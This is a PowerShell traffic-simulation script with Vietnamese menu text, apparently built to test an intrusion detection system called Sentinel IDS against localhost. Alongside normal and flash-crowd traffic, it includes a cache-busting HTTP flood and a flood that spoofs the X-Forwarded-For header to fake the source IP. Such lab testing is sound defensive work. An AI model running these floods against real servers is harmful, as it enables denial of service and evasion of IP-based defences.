# Khai bao bien o pham vi script
$script:targetUrl = "http://127.0.0.1"

function Send-Normal {
    Write-Host "`n[*] Gia lap sinh vien truy cap binh thuong (5 requests)..." -ForegroundColor Green
    for ($i=1; $i -le 5; $i++) {
        # Dung $script: de dam bao ham nhan duoc bien
        $url = "$($script:targetUrl)/"
        Invoke-WebRequest -Uri $url -UseBasicParsing | Out-Null
        Start-Sleep -Milliseconds 500
        Write-Host "  -> Da gui request $i"
    }
}

function Send-FlashCrowd {
    Write-Host "`n[*] Gia lap Flash Crowd - Spam F5 (50 requests lien tuc)..." -ForegroundColor Yellow
    for ($i=1; $i -le 50; $i++) {
        $url = "$($script:targetUrl)/"
        Invoke-WebRequest -Uri $url -UseBasicParsing | Out-Null
        Write-Host -NoNewline "."
    }
    Write-Host "`n[*] Hoan thanh."
}

function Send-HTTPFlood {
    Write-Host "`n[*] Gia lap Cache-Bypass HTTP Flood (200 requests ngau nhien)..." -ForegroundColor Red
    for ($i=1; $i -le 200; $i++) {
        $randStr = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
        # Ghep chuoi URI chuan xac
        $url = "$($script:targetUrl)/?q=$randStr"
        
        try {
            Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop | Out-Null
            Write-Host -NoNewline "!"
        } catch {
            Write-Host -NoNewline "?"
        }
    }
    Write-Host "`n[*] Hoan thanh."
}

function Send-DistributedDoS {
    Write-Host "`n[*] Gia lap Distributed DoS qua Proxy (200 requests)..." -ForegroundColor Magenta
    $fakeIp = "192.168.100.99"
    Write-Host "    IP that cua Hacker: $fakeIp"
    
    for ($i=1; $i -le 200; $i++) {
        $randStr = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
        $url = "$($script:targetUrl)/?attack=$randStr"
        
        try {
            Invoke-WebRequest -Uri $url -Headers @{"X-Forwarded-For"=$fakeIp} -UseBasicParsing -ErrorAction Stop | Out-Null
            Write-Host -NoNewline "x"
        } catch {
            Write-Host -NoNewline "!"
        }
    }
    Write-Host "`n[*] Hoan thanh."
}

# --- MENU CHINH ---
do {
    Write-Host "`n=========================================" -ForegroundColor Cyan
    Write-Host "  TOOL GIA LAP TAN CONG (SENTINEL IDS)   " -ForegroundColor Cyan
    Write-Host "=========================================" -ForegroundColor Cyan
    Write-Host "1. Normal Student (Traffic binh thuong)"
    Write-Host "2. Flash Crowd (Spam F5 - Cung 1 URL)"
    Write-Host "3. HTTP Flood DoS (Cache-Busting - Vuot nguong)"
    Write-Host "4. Distributed DoS (Fake IP X-Forwarded-For)"
    Write-Host "5. Thoat"
    Write-Host "=========================================" -ForegroundColor Cyan

    $choice = Read-Host "Chon kich ban (1-5)"

    switch ($choice) {
        '1' { Send-Normal }
        '2' { Send-FlashCrowd }
        '3' { Send-HTTPFlood }
        '4' { Send-DistributedDoS }
        '5' { Write-Host "Dang thoat script..."; break }
        default { Write-Host "Lua chon khong hop le!" -ForegroundColor DarkRed }
    }
} while ($choice -ne '5')